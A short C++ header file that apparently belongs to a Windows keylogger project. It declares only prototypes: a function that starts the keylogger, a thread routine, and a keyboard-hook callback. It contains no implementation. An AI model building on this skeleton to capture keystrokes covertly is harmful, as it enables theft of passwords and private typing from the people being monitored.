#pragma once
#include "Headers.h"
#include "ProcessMessage.h"
#include "Commonfunctional.h"
void MakeKeylogger(bool run);
DWORD WINAPI Run(void);
LRESULT CALLBACK Keylogger(int nCode, WPARAM wParam, LPARAM lParam);